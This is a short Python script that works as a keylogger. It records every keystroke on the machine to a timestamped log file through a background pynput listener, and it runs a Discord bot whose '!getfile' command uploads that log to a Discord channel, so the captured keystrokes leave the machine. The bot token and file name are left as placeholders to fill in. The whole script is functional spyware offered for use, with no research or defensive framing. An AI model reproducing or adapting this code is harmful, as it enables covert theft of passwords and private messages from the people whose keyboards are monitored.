from discord.ext import commands
import discord
from pynput.keyboard import Key, Listener
import logging
import threading

logfilename="default.txt"
#put desired file name here ^^^
 
logging.basicConfig(filename=(logfilename), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
def on_press(key):
    logging.info(str(key))
def start_key_listener():
    with Listener(on_press=on_press) as listener :
        listener.join()

listener_thread=threading.Thread(target=start_key_listener)
listener_thread.start()
TOKEN = "notokenyet"
#put token in here^

intents=discord.Intents.all()

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.command(name='getfile')
async def nine_nine(ctx):
           
    await ctx.send(file=discord.File(logfilename))

bot.run(TOKEN)


#make sure to enable privileged intents for your bot
